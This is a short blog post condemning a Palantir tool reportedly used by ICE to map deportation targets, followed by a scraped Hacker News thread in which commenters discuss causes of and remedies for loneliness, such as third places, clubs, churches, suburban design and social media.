            <p>[<a href="https://www.404media.co/elite-the-palantir-app-ice-uses-to-find-neighborhoods-to-raid/?ref=werd.io">Joseph Cox at 404 Media</a>]</p><p>This is racial profiling on a grand scale:</p><blockquote>“Palantir is working on a tool for Immigration and Customs Enforcement (ICE) that populates a map with potential deportation targets, brings up a dossier on each person, and provides a “confidence score” on the person’s current address, 404 Media has learned. ICE is using it to find locations where lots of people it might detain could be based.”</blockquote><p>It apparently looks a lot like Google Maps, but designed to show the richness of an area for “targets”, populated in part by density of immigrants. And then you can dig in:</p><blockquote>“Once a person is selected on the map interface, ELITE then shows a dossier on that particular person, according to the user guide. That includes their name, a photo, their Alien Number (the unique code given by the U.S. government to each immigrant), their date of birth, and their full address.”</blockquote><p>The Nazis could only dream of having such a capability.</p><p>Imagine working for this company, on this product. Every day, you go into work, in what I assume is a beautiful office with pine furniture and a well-stocked kitchen, and you build software that will help to deport people using what you know are extrajudicial means without due process. You probably have OKRs. There are customer calls with ICE. Every two-week sprint, you take on tasks that help make this engine better.</p><p>What do you tell yourself? What do you tell your family?</p><p>Are you on board with this agenda, or do you tell yourself you need the job to pay rent? To get healthcare?</p><p>You receive stock as part of your pay package. It’s going up! You can use it to buy a home, or to build a comfortable retirement, or some combination of the two.</p><p>Your co-workers are values aligned and work hard. They’re talented and smart. <em>Man,</em> you might think to yourself, <em>I love working with this team.</em></p><p>Or, you might think, <em>man, I’ve got to find another job.</em></p><p>Either way, you’re proud of your product work. You’re happy to take the salary, the free lunches, the espresso. And regardless of how you feel about it, the thing you do every day is powering an armed force that is kidnapping people on the street and shooting civilians, that shot a mother in the face, that is targeting people to disappear using a beautiful, modern map interface.</p><p>[<a href="https://www.404media.co/elite-the-palantir-app-ice-uses-to-find-neighborhoods-to-raid/?ref=werd.io">Link</a>]</p>

<div><p>People need to purposefully and intentionally do things. Sitting home on an app, watching TV is easy. There is no fear or rejection, there is no work to get out of the house, there is no risk. But there is also no reward.</p><p>My thoughts on this are you need to have multiple roots into your community. This is something that you go to often and talk to people, become a regular, say hi. Think back to how your parents or grandparents did it: They went to church/temple/synagogue, they went to PTA meetings, they talked to their neighbors, they were in clubs, they went to the same bar.</p><p>So I think doing things that get you out of the house, consistently the most important part:</p><p>1. People need to make a point to talk to their neighbors, invite them over for dinner or bbqs, make small talk. How towns are constructed now is a hindrance to this (unwalkable towns where all of the houses are big garages in the front and no porches).</p><p>2. Join a religious organization. Go to church, but also join the mens/womens group, join a bible studies class. Attend every week.</p><p>3. Join social clubs / ethnic organization. The polish or ukrainian clubs, knights of columbus, elks, freemasons. Go every week.</p><p>4. Join a club / league. Chess club, bowling league, softball league, golf league. Tech meetups, DnD Night etc. But you have to talk with people and try to elevate things to friendships.</p><p>5. Have lunch, happy hour, etc with coworkers.</p></div></td></tr></tbody></table></td></tr><tr id="46637748"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46637748" href="https://news.ycombinator.com/vote?id=46637748&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

You need to be in a place where enough other people do too.</p><p>Think of a city as both a spatial and a temporal grouping of people that are in the same place at a same time. Every hour a person spends at home on social media is an hour that they aren't really in the city and are not available for you to socialize with.</p><p>The cumulative hours that people spend staring at their phones are effectively a massive loss of population density.

Some of my friends groups have moved to chats on other less public platforms like Discord, Signal, or Whatsapp. But that's not the same experience. And a lot of the people I like to engage with aren't moving over to those platforms.</p><p>We all thought maybe social media would evolve into something good... but it was enshitified.

<div><p>A planned neighborhood is technically by definition not suburban sprawl, as sprawl requires a lack of planning. On the other hand, I'd argue if you can do all of that (and said walking distance is under a mile[0]) you're not even in a suburb, you're in a dense enough location to be a town or small city. Unfortunately thanks to American zoning and planning it can be very difficult to  know what your home area is actually considered and it makes this type of anecdotal evidence not particularly useful[1].</p><p>[0] A mile is essentially the farthest the average person will comfortable walk versus driving a car for travel that does not require carrying anything back. Once you add in carrying things (e.g. groceries) it drops to half a mile. Anything less dense than that and people won't want to walk, anything more dense than that and you're into standard city planning.</p><p>[1] Assuming you're American of course and obviously I'm not about to ask you to dox yourself, considering this type of thing can vary right down to the neighbourhood level.</p></div></td></tr></tbody></table></td></tr><tr id="46638008"><td></td></tr><tr id="46637697"><td><table><tbody><tr><td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td><center><a id="up_46637697" href="https://news.ycombinator.com/vote?id=46637697&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

We can expect some people to be proactive about it, but we can't expect that of everyone.</p></div></td></tr></tbody></table></td></tr><tr id="46637831"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46637831" href="https://news.ycombinator.com/vote?id=46637831&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

<div><p>Agreed. I'm not sure how it happened, but it feels like we've experienced a societal shift where a large number of people now expect and wait for other people to create nicely packaged solutions to their (real or imagined) problems.

<div><p>As far as 2 goes: As far as churches go. The type of church matters a lot. If you go to a Universalist Unitarian, or progressive Lutheran Church, yeah itll probably be 80+. Evangelical/Baptist, Latter Day Saints, Orthodox, Catholic (more traditional parishes) all are significantly younger. The more conservative the denomination the younger the congregation. The more liberal, the older they are. With conservative/liberal being adherence to scripture. This also tracks to Judaism, with Reformed Synagogues being much older than Orthodox.

My experience is similar.  I think there is a combination of "some gyms are more social" and "some people are good at breaking the ice with strangers".  On social media, I frequently hear people say stuff like: "Oh yeah, I have a bunch of friends at the gym."  I am not doubting their story, but it doesn't happen to me.</p><pre><code>    &gt; remote work ruined my mental health

I'm sorry to hear it.  I'm not here to start a holy war about remote work.  Can you share some details?  For me, remote work has me very quickly "falling apart" -- showering at 2PM or not at all.  Going to the office forces some structure into my life and everything else flows from that.

<div><p>I think part of the problem is the stuff you’re suggesting. I think everyday life needs to happen organically and if everything is scheduled and regimented and needs to be planned for, it’s very hard for the vast majority of people to actually accomplish. In the past the way, this worked was you went to church which was societally and peer enforced. People need to have marriages that last a lifetime. It’s my opinion that marriages that are a partnership without any sort of hierarchy like we had in the past are essentially doomed to fail except in a small percentage of cases. You need to have kids with stable homes that can go out on the street and be outside all day without fear of crime. Extended families need to live close to each other so there are a lot of folks raising kids and approaching life’s every day problems together. You need to shut off indoor sources of entertainment like social media and video gaming. You need to have a solid education system that is factual and science based, and only lets kids get through on the basis of meritocracy so they can be good informed citizens, and not vote for populist nonsense like we currently have. In a nutshell, what I’m trying to say is people cannot act on what’s best for them but society can put enough peer pressure on everyone for everyone’s good. This might be very hard to listen to in an individualistic society like ours and I don’t even know if I would want to live in this society, but I believe that if that’s the only option, everyone is better off.</p></div></td></tr></tbody></table></td></tr><tr id="46635483"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46635483" href="https://news.ycombinator.com/vote?id=46635483&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>
<div><p>I'm also in this group, so I have a few theories as to what causes it and how to fix it.</p><p>For one thing, I was severely traumatized as a kid, which delayed a lot of my social skills. I'm catching up but not all the way there yet. When my social battery is full, I can do pretty well, but if I'm even a little down, it's basically impossible to act normally.</p><p>I also had it hammered into me as a kid that nobody wants me around, nobody could ever love me, I'm a failure, a burden, a creep, a weirdo, and nothing but a bothersome nuisance that nobody would ever want to spend 30 seconds alone with. I'm trying to reject these thoughts, but it's difficult when you have nobody to talk to. It's like pulling yourself up by your bootstraps. I wonder how many people have the same issue. I've made a few friends in person, but I rarely get to see them.</p><p>Well I've started doing public surveys in my nearby big city, and documenting the results. I just hold out a posterboard that says "how alone do you feel"[1] or "have you ever been in love" etc, and hold out a marker, and people come up and take the survey. At first I did this out of sheer loneliness and boredom. But I have done it for enough months that some people have come up to me and told me that I've helped them, or that they look forward to my signs.</p><p>I'm trying to reach those people who feel the way I feel have no way of connecting with anyone, or at least feel that they don't. Do you have any new ideas of how to achieve this?</p><p>[1] <a href="https://chicagosignguy.com/blog/how-alone-do-you-feel.html" rel="nofollow">https://chicagosignguy.com/blog/how-alone-do-you-feel.html</a></p></div></td></tr></tbody></table></td></tr><tr id="46637665"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46637665" href="https://news.ycombinator.com/vote?id=46637665&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

Maybe we get lucky and someone will share our taste in music or movies or what have you, and the connection will be almost effortless. But to increase the rate of connection, I've found that learning to ask good questions is key.</p><p>We can learn a lot from popular interviewers like Terry Gross, Johnny Carson, or James Lipton. But to provide some direct tips: Lead with open-ended questions (i.e. not "yes or no"). Ask follow-up questions. Share a little bit while asking questions (e.g. "I'm not really into X music, more Y. Where would I start if I wanted to listen to X?")</p><p>Of course, sometimes friendships just aren't meant to be. It's tough, and can feel like a waste of time to have made the connection, but I've been surprised multiple times when a conversation that seemed like a slog of a one-off led to fruitful friendships later.</p></div></td></tr></tbody></table></td></tr><tr id="46637637"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46637637" href="https://news.ycombinator.com/vote?id=46637637&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

<div><p>You asked how to solve the loneliness epidemic. I provided citations and recommendations. Are you asking me how to be the person you need to be to make bids for friendship and connectivity to establish community? And where to find people you can have an opportunity to make connections with? I can do that too.</p><p>&gt; I'm trying to reach those people who feel the way I feel have no way of connecting with anyone, or at least feel that they don't. Do you have any new ideas of how to achieve this?</p><p>Go out and find people looking for other people. Volunteer and find events and gatherings scoped to building connections between people. Third spaces are in decline [1] [2], or in some places, non existent. This will be work. It will not be easy. You will need to work on managing the feelings of rejection and shallow people not genuinely interested in you or building a friendship (boundaries are important in this regard; have them, communicate them, and enforce them). Success is not assured. But your only choices are to try or not.</p><p>From your comment:</p><p>&gt; I also had it hammered into me as a kid that nobody wants me around, nobody could ever love me, I'm a failure, a burden, a creep, a weirdo, and nothing but a bothersome nuisance that nobody would ever want to spend 30 seconds alone with. I'm trying to reject these thoughts, but it's difficult when you have nobody to talk to. It's like pulling yourself up by your bootstraps. I wonder how many people have the same issue. I've made a few friends in person, but I rarely get to see them.</p><p>In regards to this you commented, I highly recommend therapy if you can access it. It will help. This is an unnecessary burden to be carrying through adult life, and a professional might help unburden you of these feelings. The healthier you are emotionally, the easier it will be to create and maintain interpersonal relationships.</p><p>Does all of this suck? Oh yes, certainly. But we play the hand we're dealt to the best of our ability. Good luck, in as genuine terms as I can communicate in text. If you feel like I can provide more value with more questions you might have, I will do my best to help.</p><p>[1] <i>Closure of ‘Third Places’?

Starting with immediate invitations to adjacent events ("Hey, want to grab dinner after our workout?", "Want to grab lunch after church?", "Hey, want to hit the bar after work?").

<div><p>Social media and on demand media hijack the emotional triggers that would usually be resolved by talking to people. Some examples:</p><p>* In line at the BMV, bored and feeling lonely. Should resolve loneliness by talking to strangers in line... mostly chit-chat, but sometimes you make a friend! Social media turns this into doom scrolling.</p><p>* Sitting in the living room by yourself, feeling a little lonely. Should result in calling up a friend or relative, or heading to get a coffee/beer where you can interact with people. On demand media turns this into low risk watching shows (yes, old school TV was an option, but on demand, there's always something on that is interesting).</p><p>So the trick is to make yourself ask if you should give someone a call or go somewhere public when you are pulling out the phone with intent to scroll or watch a show. When you find something you are interested in because you are watching lots of videos about it, or replying on forums, force yourself to engage in the real world. If you are arguing politics, find a group advocating your position and get involved (I've got to meet three majority leaders and two Presidents, plus a bunch of congresspeople you see on the news all the time as a side effect of getting involved because I was pissed off on the internet about business taxation issues). If you find a hobby, find a local group that does that. Learning to play the guitar from YouTube was fun, but jamming with other musicians? Off the charts fun and far more educational that just playing along with videos.</p><p>Finally, and this is the big one, try to never eat meals alone. Never say no to going to lunch with coworkers.  Join stuff that meets for breakfast. Dinners are hard, but it's surprising what happens when you invite a couple people over for dinner and a beer once in a while.</p></div></td></tr></tbody></table></td></tr><tr id="46637280"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46637280" href="https://news.ycombinator.com/vote?id=46637280&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

<div><p>Hear me out. Its not just social awkwardness. You're experiencing class boundaries and do not seem to have the right mentality to bridge the gap.</p><p>First, you call homeless people bums, which sets the stage for how you see and treat them.</p><p>I'm an excellent engineer, but I was abused and impoverished as a child, homeless as a teenager. During my 20s, I started a few companies but my savings have been continually depleted taking care of family members. I don't have a sports car or a big bank account, or nice cameras. When I see a stranger or homeless person, I smile and wave. I keep cash on me so that I always have some to give out. I buy people lunch and sit on the curb eating with them and attempting to understand them. I learn the names of my local homeless folk and ingratiate myself in the community. I've moved to a few cities so I've had the opportunity to do this a few times.</p><p>I don't do this because I lack social anxiety; I sometimes have extreme agoraphobia, to the point that I have to hype myself up for hours just to go to the grocery store, and I have to wear noise-cancelling headphones to reduce the amount of stimulation. I have PTSD. I'm an extreme introvert. A hermit at times.</p><p>But what saves me is the philosophical understanding that I have a duty to the social contract. That empathy and direct aid are nonnegotiable parts of being human. I've been homeless and I know what it's like to be truly hopeless and live a life of uncertainty, fear and hunger.</p><p>You need to bridge that gap. Class-induced anxiety is real and I acknowledge that it's probably difficult, but it's not an excuse. You sound like you're in a position to change someone's life. Taking those steps might change your own life.</p></div></td></tr></tbody></table></td></tr><tr id="46638754"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_46638754" href="https://news.ycombinator.com/vote?id=46638754&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

This is a very mature, balanced take.  If I may advise: Try some experiments on yourself.  You already know how you feel and how you socialise without drinking.  Try drinking various amounts in different social settings.  How does it feel?  Do you like yourself and your life more before?  Then go back.  Else, continue experimenting until you find a sweet spot.</p></div></td></tr></tbody></table></td></tr><tr id="46638233"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46638233" href="https://news.ycombinator.com/vote?id=46638233&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

<div><p>The first place to look is suburban development.</p><p>I wrote an article[0] on Tiny Neighborhoods (aka “Cohousing”) that starts with:</p><p>&gt; “I often wonder if the standard approach to housing is the best we can do. About 70% of Americans live in a suburb, which means that this design pattern affects our lives – where we shop, how we eat, who we know – more than any other part of modern life.”</p><p>We have been so uncritical of the set of ideas that make suburbia—single family homes, one car per adult, large private yards—even though these play a big role in how people act.</p><p>Some people want to address  loneliness by making incremental changes. But if the statistics are right and nearly everyone is somewhat lonely, we should expect that the required adjustments feel “drastic” compared to the current norm.</p><p>People would be less lonely if they could live in a community of 15-20 families with (1) shared space and (2) shared expectations for working together on their shared space.</p><p>[0] <a href="https://iambateman.com/tiny" rel="nofollow">https://iambateman.com/tiny</a></p></div></td></tr></tbody></table></td></tr><tr id="46637835"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46637835" href="https://news.ycombinator.com/vote?id=46637835&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>
<div><p>I posted on another subthread but I think this is largely an excuse. If you live in a typical suburb you have 15-20 families on your street. You can easily walk next door and chat or just say hello when you see someone outside. It takes initiative, which is the key thing that's missing. You either hide in your house or you get out and be sociable.</p></div></td></tr></tbody></table></td></tr><tr id="46638626"><td></td></tr><tr id="46637998"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46637998" href="https://news.ycombinator.com/vote?id=46637998&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>
<div><p>There are, of course, multiple causes for loneliness. We can't fix them all with one clear action. Here are the main five, in my view:</p><p>First, social media. It's too easy to temporarily forget about your loneliness by staying home and doomscrolling or watching TV.</p><p>Second, increased mobility. People move around the whole continent now for work, removing them from their closest and oldest social connections.</p><p>Third, God is dead. Churches as community centers are dying out. Young people don't trust them anymore, because they don't believe in God, and because churches had many scandals. Secular community centers are very rare and struggle with funding.</p><p>Fourth, work is more stressful now. There used to be more time to socialize, but in our quest for productivity, work became denser with fewer idle times.</p><p>Fifth, fewer people want to have kids. Much has been written about this.</p><p>Now what can we do at societal scale? First of all, study the phenomenon more closely. Who is lonely? Who isn't? Which interventions work? Which cultural factors are important?
At your local scale, you can just call or meet a friend.</p></div></td></tr></tbody></table></td></tr><tr id="46637944"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46637944" href="https://news.ycombinator.com/vote?id=46637944&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>
<div><p>The common denominator is to have shared spaces where it's expected to be among strangers' presence, and for those strangers to eventually become repeat guests in a person's life. That's the maximally comfortable scenario for inducing social behavior and it's responsible for eons of human social history. Think church.</p><p>The problem there is that it's the responsibility of groups or society to arrange that. There's not much that a single lonely person can do there.</p><p>The less common denominator, that an individual may partake in until society concocts a better solution, is to intentionally visit <i>existing</i> shared spaces even where they otherwise wouldn't (hint: bouldering gyms are good for this because there are repeat faces as well as a social okay-ness to congratulating strangers, or asking how certain challenges can be solved).</p><p>Or break with convention, comfort, and perhaps etiquette, and instead just <i>talk to people</i>. Even outside of those spaces. (This is the advice that will piss a lot of people off if it's presented as their only option.) This advice is horrible until it isn't. It does, with enough practice, 'just work'.</p><p>---</p><p>For an entrepreneur or organizer: it would just go a long way to think about things in terms of allowing conversation to happen unimpeded. Pay attention to where people talk, and about what. Conversations happen a lot in hallways but famously by water coolers, perhaps because it affords people enough time in a shared space to muster the internal capital to start a conversation.</p><p>In college I ran a forum for people to meet others and some of the most self-reportedly successful participants just asked questions into the void and were surprised by the number of responses.</p></div></td></tr></tbody></table></td></tr><tr id="46638035"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46638035" href="https://news.ycombinator.com/vote?id=46638035&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

<div><p>This is a difficult problem to want to solve. Some of it has to do with low income or joblessness. So this is the first focus I would set - make income easier to come by, more fair, more distributed. This in itself will not fix the solo state of people but it would alleviate some worries. Then we have to tackle the social problem. This is really difficult to want to solve. Activity helps, so the state should be able to encourage more activity overall. For instance, in my own youth I was physically more active, so you meet a lot of people through sports - that alone works fairly well. You can probably think of many more cohesive social structures and what not. I think it is a difficult to want to solve problem though.

<div><p>I'll add another suggestion: be more forgiving.</p><p>Anecdote: I had a friend in SF. He and I would hang out once in a while, and I always looked forward to these hangouts (we'd meet up for coffee, or go for a walk, hang out at Dolores Park, etc.). He is gay, I'm not. His perspective on things was often quite different than mine and I found that interesting. I got married, he stayed single. Even after marriage we would still hang out (though not as often as before). Then we had a child, which sucked all spare time out of my life; but even then we hung out once in a while. Then one winter there was cold/flu/COVID going around. We planned on hanging out and I unfortunately bailed on him at the last moment. This happened 2 more times. Then that bout of illnesses passed and I reached out to him to hang out again. But this time he seemed cold and distant. So I dropped it. And I didn't see him again for  almost 3 years.</p><p>Then one day I ran into him while walking through Dolores Park. He didn't see me, but I hesitated and still hollered out at him, for old times' sake. He responded and walked over. We chatted a little, I gave him a parting hug and we agreed to hang out again.</p><p>A couple of weeks later we managed to hang out again. What I gathered from our meeting was that he had been miffed at what he thought was me blowing him off; and I, when I felt he was cold and distant, had misread his grief at losing his cat. We both misread each other and wasted 3 years.</p><p>Moral of the story that I took away from it was: be more forgiving. Friendships are worth the extra effort.</p></div></td></tr></tbody></table></td></tr><tr id="46638295"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46638295" href="https://news.ycombinator.com/vote?id=46638295&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

<div><p>I think people in general need to stop letting differences rip them apart from each other.  I've seen countless friendships crumble over stupid things like politics.  (I'm not saying politics is stupid overall, but I <i>do</i> think it's stupid to let it affect a relationship, except in extreme situations).  I'm not talking about the Neo-Nazi who openly expresses hatred towards other races, or the extreme other end who insists that anything other than full throated and vocal activism makes you a bad person.  Those people are toxic and should be avoided.  IME that's like 1% of the population if not less.</p><p>Social media has (IMHO) exacerbated this by allowing us to selectively surround ourselves with people we know we'll agree with.  It's a nice reprieve sometimes, but it's so, so unhealthy beyond short-term.</p><p>Also talking to people in-person is very important.  The less you do it, the harder it is, but it's worth doing.  The natural humanizing effect of conversing with a person in meat-space does wonders for increasing understanding.  Don't talk about topics you disagree on, focus on agreements and common interests.  A good friend of mine is a trans-woman married to a woman.

<div><p>I normally don't contribute to HN comments these days (too much anger in the comments section) but I appreciate your post and activities.</p><p>I am a tail-end boomer in the U.S. so my experiences were with a world where socializing was more functional:  we shopped in public, played in public, read in public libraries, watched movies in public, rode transit together, etc.  Being in public was a requirement, not a choice.  While there are still remnants of this older culture still active in today's world in urban life, there are so many options for not being in public that it is simply easier to avoid it.  We all want our space in one degree or another.</p><p>On the playground growing up, my world was filled with name-calling and backbiting.  I was a heavier kid, so that was my burden.  Other kids had bucked teeth, warts, limps, they were too short, or too tall, uncoordinated--whatever--nobody really escaped the wrath of the crowd.  We were forced, by our parents, to just deal with it.</p><p>My parents like many others in their generation recognized this behavior for what it was--natural.  Watch an episode of the Little Rascals--you will see what I am referring to.</p><p>Most if not all of those kids who were called names and isolated in some way found ways to break out of their pigeon hole: playing sports, playing music, making art, studying hard at school, boxing, singing, dancing, cracking jokes, whatever.  Then they were heroes, and the crowd could celebrate them--and they thrived.</p><p>I know this sounds overly idealistic, but it is true.  I experienced this first hand in a neighborhood of several hundred kids from broken homes, poor homes, ethnic homes, etc.</p><p>Voiceless people must find their voice.  The responsibility is their's.  The crowd will not come to the rescue of the person who won't stand up for themselves and make their way in life.</p><p>Loneliness is very, very sad.  The cure to loneliness is in the powerful hands of the lonely person.  Do whatever it takes, as long as it takes, to work on those things that hold the lonely person back from achieving something--anything--for themselves and then engage with the crowd with more confidence.</p><p>I appreciate what you are doing by helping others--that is one of your superpowers.  Live a good, strong life!</p></div></td></tr></tbody></table></td></tr><tr id="46638353"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46638353" href="https://news.ycombinator.com/vote?id=46638353&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

Perhaps not everyone is wired to focus so much energy into that aspect of their life and we're seeing that play out with modern amenities?</p></div></td></tr></tbody></table></td></tr><tr id="46636755"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_46636755" href="https://news.ycombinator.com/vote?id=46636755&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

<div><p>I dont know the solution but few things that are root cause:</p><p>- Internet and Social Media</p><p>- Neighborhoods no longer are walkable especially suburbs at least in America. Kids are not encouraged to go bike to their friends place anymore because of traffic risks.</p><p>- High Trust societies have degraded into "lets keep ot myself, I can't trust anyone these days". Decades ago, you could just walk into a neighbor's home and say hello. Now, you need an appointment just to talk to a neighbor or are too worried what they will think of you.</p><p>- No real friendships after school/colleges. This is a huge deal once you are out on your own in the real world. Work relationships are meh at best and with remote work nowadays, it has become even worse.</p><p>- Even if you join a club or activity, they are too "planned" and "robotic". For example, my kids take a dance class and they said they don't like it. I realized why. There is no break. They don't even get to spend like 30 mins with other kids socializing etc. There is a fixed schedule. You go, you dance, you leave.</p><p>But this is the world today.

Figure out your hobbies, or find one if you don't have any.</p><p>My answer to what a lot of people call "the male loneliness epidemic" as a woman is to say it doesn't exist, you need to figure out how to be attractive. We aren't throwing ourselves on shitty men, and most of the men that complain are complaining because they feel entitled to us and thus put no effort into being attractive.

<div><p>I think the big solution consists of many small solutions. One problem I identified is that social media platforms (1) decimated local live music events coverage in mid-sized cities and (2) placed live music events into the same "filter bubble" algorithm as everything else, making it difficult for people to discover what is going on nearby.</p><p>I started <a href="https://musiclocal.org/" rel="nofollow">https://musiclocal.org</a>, a 501(c)(3), as a curated live music events platform for my local area (and hopefully others). We list all the live music events in the area, and we optimize the software for usability, performance, SEO, etc. The goal is to make discovering local live music events as easy as doom-scrolling. We have had an outstanding reception in the area we serve. We are not self-sustaining yet, but I am optimistic about our chances. As a non-profit, we do not do any of the dark-pattern garbage that has become omnipresent in social media and other consumer software. We just do the right thing as best we can.</p><p>Here is some more background (from our "Issues" page):</p><p>At MusicLocal, we focus on the root challenges facing local music communities to address endemic issues of negative social media practices, isolation and community polarization, and economic concentration and monopolization. Specifically:</p><p>• We believe convenient, comprehensive live music event listings are critical to reversing the decline in local music journalism.
• We believe ethically designed, steward-curated live music event listings provide a vital alternative to addictive social media platforms.
• We believe that making live music more visible and accessible encourages in-person interaction, strengthening communities and alleviating loneliness and social isolation.
• We believe that local live music listings are a critical component of strong local economies, helping to lessen the negative economic consequences of big tech and music industry monopolies.</p><p>---</p><p>"Technology has a purpose, and that purpose is to do good and to share" --Steve Wozniak</p></div></td></tr></tbody></table></td></tr><tr id="46637034"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46637034" href="https://news.ycombinator.com/vote?id=46637034&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>
<div><p>Well, let's start by confronting and acknowledging the very strong case that we -- "we" here being the tech world in general, and the audience of this site -- bear a heavy burden of responsibility for it.</p><p>It could be argued that it was all inevitable given the development of the Internet: development of social media, the movement online of commerce and other activities that used to heavily involve "incidental" socialization, etc. And maybe it was. But "we" are still the ones who built it. So are "we" really the right ones to solve it, through the same old silicon valley playbook?</p><p>The usual thought process of trying to push local "community groups," hobby-based organizations etc is not bad, but I think it misses an important piece of the puzzle, which is that we've started a kind of death spiral, a positive feedback loop suppressing IRL interaction. People started to move online because it was easier, and more immediate than "IRL." But as more people, and a greater fraction of our social interaction moves online, "IRL" in turn becomes even more featureless. There are fewer community groups, fewer friends at the bar or the movies, fewer people open to spontaneous interaction.

<div><p>CTRL+F "third place" -- take my upvote.</p><p>Anyone suffering in the loneliness epidemic should have a copy of <i>The Great Good Place</i>, by Ray Oldenburg. The entire point is that you should be putting yourself into socially active areas in your community.</p><p>This includes: a church, a local pub or coffee shop <i>with regulars</i> (ideally walking distance from where you live), a rec sports/game league or club.</p><p>Knowing this, I've perused it in my life and it seems very effective. I'm a regular at a Trivia Night one night per week (I don't go every week, but enough to know both the bartender and host by name). I'm a regular at a bar three blocks away from where I live, even if I consume only one non-alcoholic beverage and one alcoholic beverage per visit (a couple night a week), that leaves me plenty of time to chat with my neighbors. I'm a member of a local golf club (a very cheap municipal course), and play there every other week, and after a couple years have very good relationships with many of the other members even if we don't interact much outside of the club. At my last apartment, I was a regular at the coffee shop enough to know multiple baristas by name, it wasn't exactly a third place situation, but it was getting close before I moved. I'm not religious, but I'm very familiar with academic institutions and open lecture series that I used tot attend in grad school.</p><p>I do this intentionally. My partner had never been a regular at a bar before, and she really, really enjoys it now even though she doesn't really drink.

<div><p>on the topic of platonic friendship, I couldn’t disagree more with a lot of the comments. I have plenty of friends yet I don’t do clubs and will never, <i>ever</i> do organized religion. People advising it are religious freaks in my opinion. Some of my best friends took this advice to go to church and bible study. They complain every time I see them about the people in their church. Meanwhile I’ve made more and better friends online. Its not hard, get on social media, find an influencer/streamer that matches your vibes and go jump into the official or adjacent discord community and play video games with people in that community. If you engage in active listening and are a decent person, you will easily make plenty of friends. Additionally, I think in person hangouts are kinda mid, but I hangout with my friends in-person (at a minimum) every other day when I weight lift. Like seriously, I <i>often</i> would rather chill in Discord than go and hang out in-person.</p><p>To me the male loneliness epidemic is more about a lack of ability to find meaningful romantic relationships. I’ve been thinking about this a lot, and as somebody who has been doing online dating since it essentially started, I am pretty sure that the problem (or at least a major piece) is that match group has commodified romantic relationships.</p><p>I know a lot of people will focus on meeting people in public or whatever, but it has been my experience that dating has become completely garbage and a large part is because all of the current popular dating apps disallow index search and funnel you into swiping. From a mate selection perspective this makes no sense. Not only does it muddy the waters about who is actually a real match, but it also does psychic damage to make so many shallow judgements.</p><p>Back before match group bought OkCupid, I used to have <i>excellent</i> results finding people their who shared a lot of common ground with, messaging them with a thoughtful message, and going on dates. Swiping is an absolute crap shoot, and often I feel like I am being used.</p></div></td></tr></tbody></table></td></tr><tr id="46635857"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_46635857" href="https://news.ycombinator.com/vote?id=46635857&amp;how=up&amp;goto=item%3Fid%3D46635345"></a></center></td><td><br>

<div><p>I think part of the problem is that social media is normalized and it is easy. It is way easier to engage socially (or at least you feel like you're engaging socially) with likes and lurking and stuff. It is way harder to put on pants and go out and it is normalized to do so (phrasing like bedrotting is super casual, whereas it is actually really hard to maintain an eating disorder because you have to be constantly hiding it from people).</p><p>Also I think there's more groups whose social norms online teach you to be repulsive offline and again there's not enough social pushback against it. We do need to be harder on casual edginess online because it is teaching habitual behaviors that make it hard to engage socially. Your 50 year old hiking buddy is not going to understand your soycuck joke you are trying to show him on your phone. Your average wine mom at women-only book club is not going to love if you insist on talking about banning trans people from the club because they're "men invading the women's spaces" especially when there's very likely 0 trans people to exclude in the first place on account of trans people being rare.</p><p>Lastly there is usually a ton of stuff happening but the instructions on how to engage with it is nebulous. People who know the algorithm find it easy, the people who don't know the algorithm find it super hard. And IDK how to solve that because there's so much going on in people's heads that they don't realize the people around them seriously 